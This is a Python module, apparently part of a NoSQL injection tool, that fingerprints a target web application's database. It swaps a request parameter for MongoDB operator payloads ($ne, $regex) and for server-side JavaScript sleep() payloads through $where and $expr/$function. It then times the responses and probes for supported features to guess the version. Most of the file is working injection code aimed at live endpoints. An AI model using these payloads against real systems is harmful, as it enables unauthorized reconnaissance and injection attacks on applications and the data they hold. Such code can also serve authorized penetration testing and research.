import copy
import json
import time
import statistics
from core.logger import Logger

class Fingerprint:
    def __init__(self, requester, url, method, original_data, baseline_response, time_sec=None):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.time_sec = time_sec 
        self.logger = Logger()
        
        self.avg_latency = self._measure_latency()

    def run(self):
        self.logger.info("Starting Advanced Database Fingerprinting...")
        
        if self.check_behavioral_mongo():
            self.logger.success("Fingerprint: MongoDB (Detected via Boolean Behavior)")
            return self.deep_inspect_mongo()

        if self.check_timing_mongo():
            self.logger.success("Fingerprint: MongoDB (Detected via Timing Side-Channel)")
            return self.deep_inspect_mongo()

        if self.check_couchdb():
             self.logger.success("Fingerprint: CouchDB")
             return "CouchDB"

        self.logger.warning("Fingerprint inconclusive. Treating as Generic NoSQL.")
        return "Generic"

    def _measure_latency(self):
        latencies = []
        for _ in range(10):
            start = time.time()
            self.requester.send(self.url, self.method, self.original_data) 
            latencies.append(time.time() - start)
        return statistics.median(latencies)

    def check_behavioral_mongo(self):
        payload_true = {"$ne": "this_value_is_impossible_123"}
        
        resp_true = self.inject(payload_true)
        if not self.is_successful(resp_true):
            return False

        resp_regex = self.inject({"$regex": ".*"})
        if self.is_successful(resp_regex):
            return True
            
        return False

    def check_timing_mongo(self):
        """
        Besic TTest for MONgo-DB and support time-sec
        """
        sleep_val = self.time_sec if self.time_sec else 2
        
        payload_js = {"$where": f"sleep({sleep_val * 1000}); return true;"}
        
        if self.measure_execution(payload_js) > (self.avg_latency + (sleep_val * 0.8)):
            self.logger.info(f"Confirmed: Server-side JS Execution Enabled ($where) [Sleep: {sleep_val}s]")
            return True

        payload_expr = {
            "$expr": {
                "$function": {
                    "body": f"function() {{ sleep({sleep_val * 1000}); return true; }}",
                    "args": [],
                    "lang": "js"
                }
            }
        }
        if self.measure_execution(payload_expr) > (self.avg_latency + (sleep_val * 0.8)):
            self.logger.info(f"Confirmed: Modern MongoDB ($expr execution) [Sleep: {sleep_val}s]")
            return True

        return False

    def check_couchdb(self):
        return False

    def deep_inspect_mongo(self):
        features = []
        if self.is_successful(self.inject({"$expr": {"$eq": [1, 1]}})):
            features.append("$expr")
        if self.is_successful(self.inject({"$regex": ".*"})):
            features.append("$regex")
        if self.is_successful(self.inject({"$jsonSchema": {}})):
            features.append("$jsonSchema")

        version_guess = "Legacy"
        if "$expr" in features: version_guess = "Modern (3.6+)"
        if "$jsonSchema" in features: version_guess = "Modern (3.6+)"
        
        return f"MongoDB {version_guess} | Features: {', '.join(features)}"

    def measure_execution(self, payload):
        start = time.time()
        self.inject(payload)
        return time.time() - start

    def inject(self, payload):
        if not self.original_data or not isinstance(self.original_data, dict):
            return None
            
        key = list(self.original_data.keys())[0]
        data = copy.deepcopy(self.original_data)
        data[key] = payload
        
        try:
            return self.requester.send(self.url, self.method, data)
        except:
            return None

    def is_successful(self, response):
        if not response: return False
        if response.status_code == 200 and self.baseline.status_code != 200:
            return True
        if len(response.text) != len(self.baseline.text):
            if abs(len(response.text) - len(self.baseline.text)) > 5:
                return True
        return False